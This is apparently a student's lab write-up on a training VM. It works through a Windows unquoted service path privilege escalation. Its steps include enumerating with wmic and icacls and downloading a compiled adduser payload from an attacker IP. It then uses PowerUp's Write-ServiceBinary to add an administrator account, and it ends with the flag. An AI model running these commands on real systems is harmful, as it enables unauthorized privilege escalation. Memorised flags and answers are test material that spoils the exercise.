@@ -1,0 +1,158 @@
+Questions 1
+Follow the steps from this section on CLIENTWK220 (VM #1) to exploit the unquoted service path of GammaService. Obtain code execution, an interactive shell, or access to the GUI as an administrative user and find the flag on the desktop of daveadmin.
+HINT
+Follow the steps in this learning unit.
+If you encounter any issues with RunAs, try running an Administrator command prompt and entering dave2's credentials to obtain a shell.
+
+xfreerdp /u:steve /p:securityIsNotAnOption++++++ /v:192.168.192.220
+
+# Open Powershell 
+PS C:\Users\steve> Get-CimInstance -ClassName win32_service | Select Name,State,PathName 
+GammaService        Stopped C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe
+# Above shows a stopped service named GammaService. The unquoted service binary path contains multiple spaces and is therefore potentially vulnerable to this attack vector.
+
+# A more effective way to identify spaces in the paths and missing quotes is using the WMI command-line (WMIC) utility.
+# To use this command, please proceed with cmd.exe instead of PowerShell to avoid escaping issues
+C:\Users\steve>wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """
+...                                    
+GammaService           C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe 
+...
+
+# Before we go on, let's check if we can start and stop the identified service as steve with Start-Service and Stop-Service.
+PS C:\> Start-Service GammaService
+WARNING: Waiting for service 'GammaService (GammaService)' to start...
+PS C:\> Stop-Service GammaService
+
+# Above results shows steve user have the permissions to start and stop services
+
+# Next, let's list the paths Windows uses to attempt locating the executable file of the service.
+C:\Program.exe
+C:\Program Files\Enterprise.exe
+C:\Program Files\Enterprise Apps\Current.exe
+C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe
+
+# Lets check our access rights in these paths with icacls
+PS C:\Users\steve> icacls "C:\"
+C:\ BUILTIN\Administrators:(OI)(CI)(F)
+    NT AUTHORITY\SYSTEM:(OI)(CI)(F)
+    BUILTIN\Users:(OI)(CI)(RX)
+    NT AUTHORITY\Authenticated Users:(OI)(CI)(IO)(M)
+    NT AUTHORITY\Authenticated Users:(AD)
+    Mandatory Label\High Mandatory Level:(OI)(NP)(IO)(NW)
+
+PS C:\> icacls "C:\Program Files"
+C:\Program Files NT SERVICE\TrustedInstaller:(F)
+                 NT SERVICE\TrustedInstaller:(CI)(IO)(F)
+                 NT AUTHORITY\SYSTEM:(M)
+                 NT AUTHORITY\SYSTEM:(OI)(CI)(IO)(F)
+                 BUILTIN\Administrators:(M)
+                 BUILTIN\Administrators:(OI)(CI)(IO)(F)
+                 BUILTIN\Users:(RX)
+                 BUILTIN\Users:(OI)(CI)(IO)(GR,GE)
+                 CREATOR OWNER:(OI)(CI)(IO)(F)
+                 APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(RX)
+                 APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(OI)(CI)(IO)(GR,GE)
+                 APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(RX)
+                 APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(OI)(CI)(IO)(GR,GE)
+
+PS C:\> icacls "C:\Program Files\Enterprise Apps"
+C:\Program Files\Enterprise Apps NT SERVICE\TrustedInstaller:(CI)(F)
+                                 NT AUTHORITY\SYSTEM:(OI)(CI)(F)
+                                 BUILTIN\Administrators:(OI)(CI)(F)
+                                 BUILTIN\Users:(OI)(CI)(RX,W)
+                                 CREATOR OWNER:(OI)(CI)(IO)(F)
+                                 APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(OI)(CI)(RX)
+                                 APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(OI)(CI)(RX)
+
+# Where Enterprise Apps file shows that builtin users can perform write actions
+# Our goal is now to place a malicious file named Current.exe in C:\Program Files\Enterprise Apps\.
+
+# Go back to Kali OS to create a payload 
+Refer to adduser.c
+nano adduser.c
+x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
+chmod 777 adduser.exe
+
+# On the Victim machine 
+cd 'C:\Program Files\Enterprise Apps\'
+PS C:\Program Files\Enterprise Apps> iwr -uri http://192.168.45.178/adduser.exe -Outfile Current.exe
+
+# Try to exploit
+PS C:\Users\steve> Start-Service GammaService
+...
+Service 'GammaService (GammaService)' cannot be started due to the following error: Cannot start
+...
+
+# Service cannot start is normal as we just need to confirm our payload are successful create the user locally
+PS C:\Users\steve> net user
+PS C:\Users\steve> net localgroup administrators
+
+# To restore the functionality of the original service, we have to stop the service and delete our binary Current.exe. After the executable file is removed, Windows will use the service binary GammaServ.exe again once the service is started.
+PS C:\Program Files\Enterprise Apps> rm .\Current.exe
+PS C:\Program Files\Enterprise Apps> Stop-Service GammaService
+PS C:\Program Files\Enterprise Apps> Start-Service GammaService
+
+# Go to Kali the automated tool detects this privilege escalation vector.
+cp /usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1 .
+
+# Move the privesc automate tools to Victim PC
+PS C:\Users\steve> iwr http://192.168.45.178/PowerUp.ps1 -Outfile PowerUp.ps1
+PS C:\Users\steve> powershell -ep bypass
+PS C:\Users\steve> . .\PowerUp.ps1
+PS C:\Users\steve> Get-UnquotedService
+ServiceName    : GammaService
+Path           : C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe
+ModifiablePath : @{ModifiablePath=C:\; IdentityReference=NT AUTHORITY\Authenticated Users;
+                 Permissions=AppendData/AddSubdirectory}
+StartName      : LocalSystem
+AbuseFunction  : Write-ServiceBinary -Name 'GammaService' -Path <HijackPath>
+CanRestart     : True
+Name           : GammaService
+
+ServiceName    : GammaService
+Path           : C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe
+ModifiablePath : @{ModifiablePath=C:\; IdentityReference=NT AUTHORITY\Authenticated Users; Permissions=System.Object[]}
+StartName      : LocalSystem
+AbuseFunction  : Write-ServiceBinary -Name 'GammaService' -Path <HijackPath>
+CanRestart     : True
+Name           : GammaService
+
+ServiceName    : GammaService
+Path           : C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe
+ModifiablePath : @{ModifiablePath=C:\Program Files\Enterprise Apps; IdentityReference=BUILTIN\Users;
+                 Permissions=System.Object[]}
+StartName      : LocalSystem
+AbuseFunction  : Write-ServiceBinary -Name 'GammaService' -Path <HijackPath>
+CanRestart     : True
+Name           : GammaService
+
+ServiceName    : GammaService
+Path           : C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe
+ModifiablePath : @{ModifiablePath=C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe;
+                 IdentityReference=BUILTIN\Users; Permissions=System.Object[]}
+StartName      : LocalSystem
+AbuseFunction  : Write-ServiceBinary -Name 'GammaService' -Path <HijackPath>
+CanRestart     : True
+Name           : GammaService
+
+# Above results shows that the GammaService was identified as vulnerable. Let's use the AbuseFunction and restart the service to attempt to elevate our privileges.
+
+PS C:\Users\steve> Write-ServiceBinary -Name 'GammaService' -Path "C:\Program Files\Enterprise Apps\Current.exe"
+GammaService C:\Program Files\Enterprise Apps\Current.exe net user john Password123! /add && timeout /t 5 && net loc...
+PS C:\Users\steve> restart-service GammaService
+PS C:\Users\steve> net user
+...
+john
+...
+
+# Now we will see the john user is added
+
+PS C:\Users\steve> net localgroup administrators
+...
+john
+...
+
+# Access to john users
+PS C:\Users\steve> start-process PowerShell -verb runas
+PS C:\Users\daveadmin\Desktop> type flag.txt
+OS{eabe79aaf3a5164e1b6630e72f0615f0}
